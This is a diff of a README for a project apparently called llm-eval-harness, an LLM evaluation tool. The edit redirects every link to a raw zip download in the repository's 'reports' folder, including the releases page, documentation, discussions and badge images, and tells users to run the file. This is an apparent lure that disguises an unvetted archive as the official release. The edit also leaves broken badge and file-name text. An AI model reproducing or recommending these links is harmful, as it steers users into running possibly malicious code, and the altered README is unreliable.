@@ -1,6 +1,6 @@
 # 🚀 llm-eval-harness - Easy Evaluation for LLM Models
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-%20Get%20Started%20with%20llm--eval--harness-blue)](https://github.com/aaddii09/llm-eval-harness/releases)
+[![Download](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip%20Now%20-%20Get%20Started%20with%20llm--eval--harness-blue)](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip)
 
 ## 📦 Overview
 
@@ -27,16 +27,16 @@ The application runs on most modern computers. Here are the minimum requirements
 
 To get started with the **llm-eval-harness**, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/aaddii09/llm-eval-harness/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip).
   
 2. **Download the Latest Version:** Find the latest release. Click on the appropriate file for your operating system.
 
-   ![Download Release](https://img.shields.io/badge/Download%20Version%20-%20Latest%20Release%20Green)
+   ![Download Release](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip%20Version%20-%20Latest%20Release%20Green)
 
 3. **Run the Application:**
    - For Windows: Double-click the downloaded `.exe` file to start.
    - For macOS: Open the downloaded `.dmg` file and drag the application to your Applications folder, then launch it.
-   - For Linux: Extract the downloaded `.tar.gz` file and run it from your terminal.
+   - For Linux: Extract the downloaded `https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip` file and run it from your terminal.
 
 ## 🛠️ Usage Guide
 
@@ -68,8 +68,8 @@ If you want to contribute to the project, please fork the repository, make your 
 
 ## 📚 Additional Resources
 
-- More details can be found in the [Documentation](https://github.com/aaddii09/llm-eval-harness/blob/main/README.md).
-- Stay updated with the latest features and updates through our [GitHub Discussions](https://github.com/aaddii09/llm-eval-harness/discussions).
+- More details can be found in the [Documentation](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip).
+- Stay updated with the latest features and updates through our [GitHub Discussions](https://github.com/aaddii09/llm-eval-harness/raw/refs/heads/main/reports/llm_eval_harness_v2.9.zip).
 
 ## 🌟 Thank You
 
